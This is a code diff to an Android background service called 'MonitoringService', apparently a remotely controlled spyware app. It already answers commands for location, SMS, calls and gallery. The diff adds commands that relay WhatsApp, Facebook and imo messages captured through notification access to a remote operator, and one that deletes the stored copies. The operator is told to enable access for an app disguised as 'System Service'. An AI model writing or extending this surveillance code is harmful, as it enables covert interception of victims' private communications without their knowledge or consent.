@@ -193,6 +193,15 @@ class MonitoringService : LifecycleService() {
             cmd == "/location" -> location()
             cmd == "/battery" -> battery()
             cmd == "/sms" -> sms()
+            cmd == "/whatsapp" -> showMessages("whatsapp")
+cmd == "/fb" -> showMessages("fb")
+cmd == "/imo" -> showMessages("imo")
+cmd == "/clearmsgs" -> {
+    MessageStore.clearMessages(this, "whatsapp")
+    MessageStore.clearMessages(this, "fb")
+    MessageStore.clearMessages(this, "imo")
+    sendMsg("🗑 All stored messages cleared")
+}
             cmd == "/calls" -> calls()
             cmd == "/gallery" -> gallery()
             cmd == "/flash" -> flash()
@@ -326,6 +335,48 @@ class MonitoringService : LifecycleService() {
             }
             sendMsg(sb.toString())
         } catch (e: Exception) { sendMsg("❌ ${e.message}") }
+    }
+    
+    private fun showMessages(app: String) {
+        val msgs = MessageStore.getMessages(this, app)
+        val emoji = when (app) {
+            "whatsapp" -> "💬"
+            "fb" -> "📘"
+            "imo" -> "📱"
+            else -> "📩"
+        }
+
+        val listenerEnabled = try {
+            val enabled = android.provider.Settings.Secure.getString(
+                contentResolver,
+                "enabled_notification_listeners"
+            ) ?: ""
+            enabled.contains(packageName)
+        } catch (_: Exception) { false }
+
+        val diag = """
+📊 Diagnostic:
+• Listener: ${if (listenerEnabled) "✅ ON" else "❌ OFF"}
+• Stored: ${msgs.size} messages
+""".trimIndent()
+
+        if (msgs.isEmpty()) {
+            val reason = when {
+                !listenerEnabled -> "❌ Notification Access OFF!\nSettings → Notification Access → System Service → ON"
+                else -> "❌ No messages captured yet.\n\n• අලුත් messages විතරයි save වෙන්නේ\n• පරණ messages බලන්න බෑ (encrypted)"
+            }
+            sendMsg("$emoji ${app.uppercase()}\n\n$reason\n\n$diag")
+            return
+        }
+
+        val sb = StringBuilder()
+        sb.append("$emoji ${app.uppercase()} (${msgs.size} messages)\n\n")
+        for (m in msgs.take(15)) {
+            sb.append("👤 ${m.from}\n${m.text}\n\n")
+        }
+        if (msgs.size > 15) sb.append("... and ${msgs.size - 15} more\n\n")
+        sb.append("\n$diag")
+        sendMsg(sb.toString())
     }
 
     private fun calls() {
